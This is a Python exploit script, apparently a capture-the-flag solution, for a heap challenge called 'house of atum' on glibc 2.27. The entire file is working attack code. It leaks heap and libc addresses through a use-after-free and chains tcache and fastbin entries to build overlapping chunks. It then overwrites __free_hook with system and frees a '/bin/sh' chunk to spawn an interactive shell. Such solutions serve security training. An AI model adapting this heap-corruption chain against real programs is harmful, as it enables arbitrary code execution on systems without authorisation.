# File: exp.py
# Author: raycp
# Date: 2019-06-06
# Description: exp for house of atum, tcache and fastbin chain to form the 0x10 byte backwards

from pwn_debug import *


pdbg=pwn_debug("./houseofAtum")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()


def add(content):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("ontent:")
    p.send(content)

def edit(idx,content):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil(" idx:")
    p.sendline(str(idx))
    p.recvuntil("content:")
    p.send(content)

def delete(idx,choice='n'):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil(" idx:")
    p.sendline(str(idx))
    p.recvuntil("(y/n):")
    p.sendline(choice)

def show(idx):
    p.recvuntil("choice:")
    p.sendline("4")
    p.recvuntil(" idx:")
    p.sendline(str(idx))
    

def pwn():
    
    #pdbg.bp()

    add('0')
    add((p64(0)+p64(0x11))*4)

    for i in range(7):
        delete(0)

    # leak heap address by uaf
    show(0)
    p.recvuntil("Content:")
    leak_heap=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))
    heap_base=leak_heap-0x260
    log.info("leak heap base: %s"%(hex(heap_base)))

    delete(1,'y')
    delete(0,'y')
    
    ## backwards 0x20 byte by tcache and fastbin chain, which will form overlap memory
    ### time 1
    add((p64(0)+p64(0x51))*4)
    add((p64(0)+p64(0x11))*4)
    delete(0)
    delete(0)
    delete(1,'y')
    delete(0,'y')

    ## time 2
    add((p64(0)+p64(0x51))*4)
    add((p64(0)+p64(0x11))*4)
    delete(0)
    delete(0)
    delete(1,'y')
    delete(0,'y')

    ## overwrite fd to heap_base+0x250 by overlap chunk
    payload=p64(0)+p64(0)+p64(0)+p64(0x81)+p64(heap_base+0x250)
    add(payload)
    add(p64(0))

    delete(1,'y')
    
    add(p64(0)+p64(0x51))
    #pdbg.bp(0xd0e)
    delete(0)

    # overwrite the chunk size
    edit(1,p64(0)+p64(0x91))
    for i in range(7):
        delete(0)
    
    # leak libc address
    delete(0,'y')
    edit(1,'a'*0x10)
    show(1)

    p.recvuntil("Content:")
    p.recvuntil("a"*0x10)
    leak_libc=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))
    libc_base=leak_libc-libc.symbols['main_arena']-0x60
    free_hook=libc_base+libc.symbols['__free_hook']
    system_addr=libc_base+libc.symbols['system']
    log.info("leak libc base: %s"%(hex(libc_base)))
    
    # overwrite chunk size and fd to free_hook
    edit(1,'/bin/sh\x00'+p64(0x71)+p64(free_hook))

    add(p64(0))

    ## free the chunk into 0x70 tcache chain
    delete(0,'y')

    ## malloc out free_hook
    add(p64(system_addr))

    ## trigger free
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil(" idx:")
    p.sendline(str(1))

    p.interactive() 

if __name__ == '__main__':
   pwn()


